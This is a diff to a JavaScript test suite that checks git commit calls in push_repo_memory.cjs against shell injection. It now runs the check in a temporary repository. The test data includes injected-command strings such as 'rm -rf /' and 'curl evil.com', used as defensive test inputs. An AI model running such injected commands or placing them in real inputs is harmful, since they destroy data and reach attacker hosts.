@@ -1310,22 +1310,29 @@ describe("push_repo_memory.cjs - shell injection security tests", () => {
     it("should safely handle malicious commit messages", () => {
       // Test that malicious commit messages would be treated as literals
       const maliciousMessages = ["Update; rm -rf /", "Update && curl evil.com", "Update\nmalicious command", 'Update"; echo hacked'];
+      const repoDir = fs.mkdtempSync(path.join(os.tmpdir(), "push-repo-memory-commit-"));
 
       // With spawnSync and args array, these would be literal commit messages
       // No shell interpretation occurs
-      for (const message of maliciousMessages) {
-        const { spawnSync } = require("child_process");
-        // Note: This would fail in actual use because there are no staged changes
-        // But it demonstrates that special characters are treated literally
-        const result = spawnSync("git", ["commit", "-m", message], {
-          encoding: "utf8",
-          stdio: "pipe",
-        });
+      try {
+        execFileSync("git", ["init", "--quiet"], { cwd: repoDir, stdio: "pipe" });
+        for (const message of maliciousMessages) {
+          const { spawnSync } = require("child_process");
+          // Note: This would fail in actual use because there are no staged changes
+          // But it demonstrates that special characters are treated literally
+          const result = spawnSync("git", ["commit", "-m", message], {
+            cwd: repoDir,
+            encoding: "utf8",
+            stdio: "pipe",
+          });
 
-        // The command would fail (no staged changes), but importantly:
-        // The malicious part of the message should NOT be executed
-        // Special characters like ; && | should be part of the commit message, not shell operators
-        expect(result.status).not.toBe(0);
+          // The command would fail (no staged changes), but importantly:
+          // The malicious part of the message should NOT be executed
+          // Special characters like ; && | should be part of the commit message, not shell operators
+          expect(result.status).not.toBe(0);
+        }
+      } finally {
+        fs.rmSync(repoDir, { recursive: true, force: true });
       }
     });
 
